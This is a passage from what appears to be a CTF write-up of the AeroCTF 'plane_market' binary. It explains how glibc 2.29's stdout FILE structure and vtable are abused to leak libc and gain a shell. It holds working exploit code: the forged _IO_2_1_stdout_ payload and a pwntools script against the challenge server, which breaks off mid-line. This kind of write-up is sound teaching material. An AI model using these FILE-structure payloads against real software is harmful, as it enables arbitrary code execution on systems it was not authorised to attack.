class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">IO_2_1_stdout-&gt;file-&gt;_flags = <span class="number">0xfbad1800</span> </span><br><span class="line">IO_2_1_stdout-&gt;file-&gt;_IO_read_ptr = <span class="number">0x0</span> </span><br><span class="line">IO_2_1_stdout-&gt;file-&gt;_IO_read_end = <span class="number">0x0</span></span><br><span class="line">IO_2_1_stdout-&gt;file-&gt;_IO_read_base = <span class="number">0x0</span></span><br><span class="line">IO_2_1_stdout-&gt;file-&gt;_IO_write_base; <span class="comment">//modify last byte with 0xa or 0x0</span></span><br></pre></td></tr></table></figure><p>To get the libc source code of this version we can get the source from glibc git and change to the correct branch:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$ strings libc.so.6 | grep <span class="string">'glibc'</span></span><br><span class="line">glibc 2.29</span><br><span class="line">Fatal error: glibc detected an invalid stdio handle</span><br><span class="line">Fatal glibc error: array index %zu not less than array length %zu</span><br><span class="line">Fatal glibc error: invalid allocation buffer of size %zu</span><br><span class="line"></span><br><span class="line">$ git <span class="built_in">clone</span> git://sourceware.org/git/glibc.git</span><br><span class="line">Cloning into <span class="string">'glibc'</span>...</span><br><span class="line">remote: Enumerating objects: 580861, <span class="keyword">done</span>.</span><br><span class="line">remote: Counting objects: 100% (580861/580861), <span class="keyword">done</span>.</span><br><span class="line">remote: Compressing objects: 100% (77106/77106), <span class="keyword">done</span>.</span><br><span class="line">remote: Total 580861 (delta 492799), reused 580285 (delta 492341)</span><br><span class="line">Receiving objects: 100% (580861/580861), 175.11 MiB | 1.63 MiB/s, <span class="keyword">done</span>.</span><br><span class="line">Resolving deltas: 100% (492799/492799), <span class="keyword">done</span>.</span><br><span class="line">Updating files: 100% (17361/17361), <span class="keyword">done</span>.</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">cd</span> glibc</span><br><span class="line"></span><br><span class="line">$ git checkout release/2.29/master</span><br><span class="line">Updating files: 100% (12744/12744), <span class="keyword">done</span>.</span><br><span class="line">Branch <span class="string">'release/2.29/master'</span> <span class="built_in">set</span> up to track remote branch <span class="string">'release/2.29/master'</span> from <span class="string">'origin'</span>.</span><br><span class="line">Switched to a new branch <span class="string">'release/2.29/master'</span></span><br></pre></td></tr></table></figure><p>And why ? “puts” internally calls <strong>_IO_new_file_xsputn</strong> which eventually calls <strong>IO_OVERFLOW</strong>.<br>Examining <strong>IO_OVERFLOW</strong> which its function is denoted by <strong>_IO_new_file_overflow</strong> and located at <strong>glibc/libio/fileops.c</strong>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_new_file_overflow (FILE *f, <span class="keyword">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    ... truncated ...</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base, <span class="comment">// We want this</span></span><br><span class="line">             f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br></pre></td></tr></table></figure><p>Eventually <strong>_IO_do_write</strong> will be called in this function. <code>stdout-&gt;_flags &amp; _IO_NO_WRITES</code> is set to zero to avoid running some unnecessary code, we do the same for <code>stdout-&gt;_flags &amp; _IO_CURRENTLY_PUTTING</code>.</p><p><code>_IO_new_file_overflow</code> calls <code>_IO_do_write</code> with arguments as <code>stdout</code>, <code>stdout-&gt;_IO_write_base</code> and size of the buffer which is calculated via <code>f-&gt;_IO_write_ptr - f-&gt;_IO_write_base</code>.</p><p>From changelogs we know that <code>_IO_do_write</code> is defined as a macro for <strong>_IO_new_do_write</strong>:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">versioned_symbol (libc, _IO_new_do_write, _IO_do_write, GLIBC_2_1);</span><br></pre></td></tr></table></figure></p><p><strong>_IO_new_do_write</strong> will call <strong>new_do_write</strong> with the same parameters (glibc/libio/fileops.c):</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_new_do_write (FILE *fp, <span class="keyword">const</span> <span class="keyword">char</span> *data, <span class="keyword">size_t</span> to_do)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (to_do == <span class="number">0</span></span><br><span class="line">      || (<span class="keyword">size_t</span>) new_do_write (fp, data, to_do) == to_do) ? <span class="number">0</span> : EOF;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_do_write, _IO_do_write)</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">size_t</span></span><br><span class="line">new_do_write (FILE *fp, <span class="keyword">const</span> <span class="keyword">char</span> *data, <span class="keyword">size_t</span> to_do)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">size_t</span> count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">off64_t</span> new_pos</span><br><span class="line">    = _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do); <span class="comment">// our aim</span></span><br><span class="line">  ... truncated ...</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The intention is to skip the <strong>else if</strong> block, to achieve this we need to make this true <code>fp-&gt;_flags &amp; _IO_IS_APPENDING</code>, so we can set the right flags like this</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_flags = <span class="number">0xfbad0000</span>  <span class="comment">// Magic number</span></span><br><span class="line">_flags &amp; = ~_IO_NO_WRITES <span class="comment">// _flags = 0xfbad0000</span></span><br><span class="line">_flags | = _IO_CURRENTLY_PUTTING <span class="comment">// _flags = 0xfbad0800</span></span><br><span class="line">_flags | = _IO_IS_APPENDING <span class="comment">// _flags = 0xfbad1800</span></span><br></pre></td></tr></table></figure><p>All that we have to do is to set <strong>stdout-&gt;_flags</strong> to the value we calculated and partial overwrite <strong>stdout-&gt;_IO_write_base</strong> to make it point somewhere to get a leak.</p><p>Having libc we just need to find a way to get a shell, we can use <code>IO_FILE</code> structure again, but this time instead of entering <code>IO_OVERFLOW</code> we want to actually change its pointer and how we can do this? Each <code>IO_FILE</code> has a vtable that contains multiple saved pointers to functions like <code>IO_OVERFLOW</code>:<br><a data-fancybox="gallery" href="https://i.imgur.com/XWC0ex8.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/XWC0ex8.png" alt><br></a><br>Let’s see the contents of IO_file_jumps vtable:<br><a data-fancybox="gallery" href="https://i.imgur.com/mqUQ3bh.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/mqUQ3bh.png" alt><br></a><br>But <strong>IO_file_jumps</strong> is to far from the <strong>stdout</strong>, to actually change that pointer, it would require us to change a lot of things in memory, instead we can change the vtable pointer to IO_helper_jumps. </p><p>And yes vtables are <strong>writeable</strong> again in libc-2.29 for some reason:<br><a data-fancybox="gallery" href="https://i.imgur.com/iywbYvx.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/iywbYvx.png" alt><br></a><br>Here is the call of <strong>IO_OVERFLOW</strong> at <strong>_IO_new_file_xsputn</strong>:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span></span><br><span class="line">_IO_new_file_xsputn (FILE *f, <span class="keyword">const</span> <span class="keyword">void</span> *data, <span class="keyword">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *s = (<span class="keyword">const</span> <span class="keyword">char</span> *) data;</span><br><span class="line">  <span class="keyword">size_t</span> to_do = n;</span><br><span class="line">  <span class="keyword">int</span> must_flush = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">size_t</span> count = <span class="number">0</span>;</span><br><span class="line">  ... truncated ...</span><br><span class="line">  <span class="keyword">if</span> (to_do + must_flush &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">size_t</span> block_size, do_write;</span><br><span class="line">      <span class="comment">/* Next flush the (full) buffer. */</span></span><br><span class="line">      <span class="keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF) <span class="comment">// We want to get control of this</span></span><br><span class="line">    <span class="comment">/* If nothing else has to be written we must not signal the</span></span><br><span class="line"><span class="comment">       caller that everything has been written.  */</span></span><br><span class="line">    <span class="keyword">return</span> to_do == <span class="number">0</span> ? EOF : n - to_do;</span><br><span class="line">      ... truncated ...</span><br><span class="line">  <span class="keyword">return</span> n - to_do;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>The python line to edit the -2 index aka stdout:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">change_plane_name(<span class="number">-2</span>, p64(<span class="number">0xfbad1800</span>)+<span class="number">3</span>*p64(<span class="number">0</span>))</span><br><span class="line">LEAK = u64(r.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">LIBC = LEAK<span class="number">-0x1bc570</span></span><br><span class="line">log.info(<span class="string">'LEAK 0x%x'</span>% LEAK)</span><br><span class="line">log.info(<span class="string">'LIBC 0x%x'</span>% LIBC)</span><br></pre></td></tr></table></figure></p><p>If we leak with success we start building stdout overflow:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">_IO_2_1_stdout_ = <span class="string">'/bin/sh\x00'</span><span class="comment"># flags</span></span><br><span class="line">_IO_2_1_stdout_ += <span class="number">3</span>*p64(<span class="number">0</span>) <span class="comment"># _IO_read_ptr,_IO_read_end,_IO_read_base</span></span><br><span class="line">_IO_2_1_stdout_ += p64((LIBC+<span class="number">0x1e57e3</span>) &amp; <span class="number">0xffffffffff00</span>) <span class="comment"># _IO_write_base</span></span><br><span class="line">_IO_2_1_stdout_ += p64(LIBC+<span class="number">0x1e57e3</span>) <span class="comment"># _IO_write_ptr</span></span><br><span class="line">_IO_2_1_stdout_ += p64(LIBC+<span class="number">0x1e57e3</span>) <span class="comment"># _IO_write_end</span></span><br><span class="line">_IO_2_1_stdout_ += p64(LIBC+<span class="number">0x1e57e3</span>) <span class="comment"># _IO_buf_base</span></span><br><span class="line">_IO_2_1_stdout_ += p64(LIBC+<span class="number">0x1e57e3</span>+<span class="number">1</span>) <span class="comment"># _IO_buf_end</span></span><br><span class="line">_IO_2_1_stdout_ += p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">_IO_2_1_stdout_ += p64(LIBC+libc.symbols[<span class="string">'_IO_2_1_stdin_'</span>]) <span class="comment"># _chain</span></span><br><span class="line">_IO_2_1_stdout_ += p32(<span class="number">0x1</span>) <span class="comment"># _fileno</span></span><br><span class="line">_IO_2_1_stdout_ += p32(<span class="number">0x0</span>) <span class="comment"># _flags2</span></span><br><span class="line">_IO_2_1_stdout_ += p64(<span class="number">-0x1</span>, signed=<span class="keyword">True</span>) <span class="comment">#_old_offset</span></span><br><span class="line">_IO_2_1_stdout_ += p16(<span class="number">0x0</span>) <span class="comment"># _cur_column</span></span><br><span class="line">_IO_2_1_stdout_ += p8(<span class="number">0x0</span>) <span class="comment"># _vtable_offset</span></span><br><span class="line">_IO_2_1_stdout_ += p8(<span class="number">0x0</span>) <span class="comment"># _shortbuf</span></span><br><span class="line">_IO_2_1_stdout_ += p32(<span class="number">0x0</span>) <span class="comment"># _shortbuf</span></span><br><span class="line">_IO_2_1_stdout_ += p64(LIBC+libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>]+<span class="number">0x1e20</span>) <span class="comment"># _LOCK</span></span><br><span class="line">_IO_2_1_stdout_ += p64(<span class="number">-0x1</span>, signed=<span class="keyword">True</span>) <span class="comment"># _offset</span></span><br><span class="line">_IO_2_1_stdout_ += p64(<span class="number">0x0</span>) <span class="comment"># _codecvt</span></span><br><span class="line">_IO_2_1_stdout_ += p64(LIBC+libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>]<span class="number">-0xea0</span>) <span class="comment"># _wide_data</span></span><br><span class="line">_IO_2_1_stdout_ += p64(<span class="number">0x0</span>) <span class="comment"># _freeres_list</span></span><br><span class="line">_IO_2_1_stdout_ += p64(<span class="number">0x0</span>) <span class="comment"># _freeres_buf</span></span><br><span class="line">_IO_2_1_stdout_ += p64(<span class="number">0x0</span>) <span class="comment"># __pad5</span></span><br><span class="line">_IO_2_1_stdout_ += p32(<span class="number">-0x1</span>, signed=<span class="keyword">True</span>) <span class="comment"># _mode</span></span><br><span class="line">_IO_2_1_stdout_ += p32(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">_IO_2_1_stdout_ += p64(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">_IO_2_1_stdout_ += p64(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">_IO_2_1_stdout_ += p64(LIBC+libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>]+<span class="number">0x200</span>) <span class="comment"># IO_helper_jumps</span></span><br><span class="line">STDERR = p64(LIBC+libc.symbols[<span class="string">'_IO_2_1_stderr_'</span>]) <span class="comment"># stderr</span></span><br><span class="line">STDOUT = p64(LIBC+libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>]) <span class="comment"># stdout</span></span><br><span class="line">STDIN = p64(LIBC+libc.symbols[<span class="string">'_IO_2_1_stdin_'</span>]) <span class="comment"># stdin</span></span><br><span class="line">INPUT = _IO_2_1_stdout_+STDERR+STDIN+STDOUT+p64(<span class="number">0</span>)*<span class="number">2</span>*<span class="number">17</span>+p64(<span class="number">0</span>)+p64(LIBC+<span class="number">0x80650</span>)+p64(LIBC+libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">change_plane_name(<span class="number">-2</span>, INPUT, <span class="keyword">False</span>)</span><br></pre></td></tr></table></figure><p>After this we can get a shell pops the full exploit:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">host, port = <span class="string">"tasks.aeroctf.com"</span>, <span class="string">"33087"</span></span><br><span class="line">filename = <span class="string">"./plane_marketbkup"</span></span><br><span class="line"><span class="comment">#filename = "./plane_market"</span></span><br><span class="line"></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#if not args.REMOTE:</span></span><br><span class="line"><span class="comment">#    libc = elf.libc</span></span><br><span class="line"><span class="comment">#else:</span></span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> process(filename, env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libc.so.6"</span>&#125;) <span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">else</span> remote(host, port)</span><br><span class="line">    <span class="comment">#return process(filename) if not args.REMOTE else remote(host, port)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_PIE</span><span class="params">(proc)</span>:</span></span><br><span class="line">    memory_map = open(<span class="string">"/proc/&#123;&#125;/maps"</span>.format(proc.pid),<span class="string">"rb"</span>).readlines()</span><br><span class="line">    <span class="keyword">return</span> int(memory_map[<span class="number">0</span>].split(<span class="string">"-"</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(bp)</span>:</span></span><br><span class="line">    script = <span class="string">""</span></span><br><span class="line">    PIE = get_PIE(r)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> bp:</span><br><span class="line">        script += <span class="string">"b *0x%x\n"</span>%(x)</span><br><span class="line">    gdb.attach(r,gdbscript=script)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(psize,name,cost,yn, size=<span class="number">0</span>, comm=<span class="string">""</span>)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'&gt; '</span>, <span class="string">'1'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Enter name size: '</span>,str(psize))</span><br><span class="line">    r.sendlineafter(<span class="string">'Enter plane name: '</span>,name)</span><br><span class="line">    r.sendlineafter(<span class="string">'Enter plane cost: '</span>,str(cost))</span><br><span class="line">    r.sendlineafter(<span class="string">'Do you wanna leave a comment? [Y\\N]: '</span>,yn) </span><br><span class="line">    <span class="keyword">if</span> yn == <span class="string">'Y'</span>:</span><br><span class="line">        r.sendlineafter(<span class="string">'Enter comment size: '</span>, str(size))</span><br><span class="line">        r.sendlineafter(<span class="string">'Comment: '</span>,comm)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(pid)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'&gt; '</span>, <span class="string">'2'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Enter plane id: '</span>,str(pid))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view_list</span><span class="params">()</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'&gt; '</span>, <span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view_plane</span><span class="params">(pid)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'&gt; '</span>, <span class="string">'4'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Enter plane id: '</span>, str(pid))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_plane_name</span><span class="params">(pid, name, nl=True)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'&gt; '</span>, <span class="string">'5'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Enter plane id: '</span>, str(pid))</span><br><span class="line">    <span class="keyword">if</span> nl:</span><br><span class="line">        r.sendlineafter(<span class="string">'Enter new plane name: '</span>, name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r.sendafter(<span class="string">'Enter new plane name: '</span>, name)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'new-window'</span>]</span><br><span class="line"><span class="comment">#for i in range(0x1000):</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> r</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = getConn()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">and</span> args.GDB:</span><br><span class="line">            debug([<span class="number">0x401363</span>,<span class="number">0x4013ED</span>,<span class="number">0x401bc7</span>,<span class="number">0x40139F</span>])<span class="comment">#0x40145C,0x40148C,0x4011EC])</span></span><br><span class="line">        r.sendlineafter(<span class="string">'Enter name: '</span>,<span class="string">'%x'</span>)</span><br><span class="line">        change_plane_name(<span class="number">-2</span>, p64(<span class="number">0xfbad1800</span>)+<span class="number">3</span>*p64(<span class="number">0</span>))</span><br><span class="line">        <span class="comment">#context.log_level='debug'</span></span><br><span class="line">        LEAK = u64(r.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">        LIBC = LEAK<span class="number">-0x1bc570</span></span><br><span class="line">        log.info(<span class="string">'LEAK 0x%x'</span>% LEAK)</span><br><span class="line">        log.info(<span class="string">'LIBC 0x%x'</span>% LIBC)</span><br><span class="line">        _IO_2_1_stdout_ = <span class="string">'/bin/sh\x00'</span><span class="comment">#p64(0xfbad1800)</span></span><br><span class="line">        _IO_2_1_stdout_ += <span class="number">3</span>*p64(<span class="number">0</span>)</span><br><span class="line">        _IO_2_1_stdout_ += p64((LIBC+<span class="number">0x1e57e3</span>) &amp; <span class="number">0xffffffffff00</span>) <span class="comment"># _IO_write_base</span></span><br><span class="line">        _IO_2_1_stdout_ += p64(LIBC+<span class="number">0x1e57e3</span>) <span class="comment"># _IO_write_ptr</span></span><br><span class="line">        _IO_2_1_stdout_ += p64(LIBC+<span class="number">0x1e57e3</span>) <span class="comment"># _IO_write_end</span></span><br><span class="line">        _IO_2_1_stdout_ += p64(LIBC+<span class="number">0x1e57e3</span>) <span class="comment"># _IO_buf_base</span></span><br><span class="line">        _IO_2_1_stdout_ += p64(LIBC+<span class="number">0x1e57e3</span>+<span class="number">1</span>) <span class="comment"># _IO_buf_end</span></span><br><span class="line">        _IO_2_1_stdout_ += p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">        _IO_2_1_stdout_ += p64(LIBC+libc.symbols[<span class="string">'_IO_2_1_stdin_'</span>]) <span class="comment"># _chain</span></span><br><span class="line">        _IO_2_1_stdout_ += p32(<span class="number">0x1</span>) <span class="comment"># _fileno</span></span><br><span class="line">        _IO_2_1_stdout_ += p32(<span class="number">0x0</span>) <span class="comment"># _flags2</span></span><br><span class="line">        _IO_2_1_stdout_ += p64(<span class="number">-0x1</span>, signed=<span class="keyword">True</span>) <span class="comment">#_old_offset</span></span><br><span class="line">        _IO_2_1_stdout_ += p16(<span class="number">0x0</span>) <span class="comment"># _cur_column</span></span><br><span class="line">        _IO_2_1_stdout_ += p8(<span class="number">0x0</span>) <span class="comment"># _vtable_offset</span></span><br><span class="line">        _IO_2_1_stdout_ += p8(<span class="number">0x0</span>) <span class="comment"># _shortbuf</span></span><br><span class="line">        _IO_2_1_stdout_ += p32(<span class="number">0x0</span>) <span class="comment"># _shortbuf</span></span><br><span class="line">        _IO_2_1_stdout_ += p64(LIBC+libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>]+<span class="number">0x1e20</span>) <span class="comment"># _LOCK</span></span><br><span class="line">        _IO_2_1_stdout_ += p64(<span class="number">-0x1</span>, signed=<span class="keyword">True</span>) <span class="comment"># _offset</span></span><br><span class="line">        _IO_2_1_stdout_ += p64(<span class="number">0x0</span>) <span class="comment"># _codecvt</span></span><br><span class="line">        _IO_2_1_stdout_ += p64(LIBC+libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>]<span class="number">-0xea0</span>) <span class="comment"># _wide_data</span></span><br><span class="line">        _IO_2_1_stdout_ += 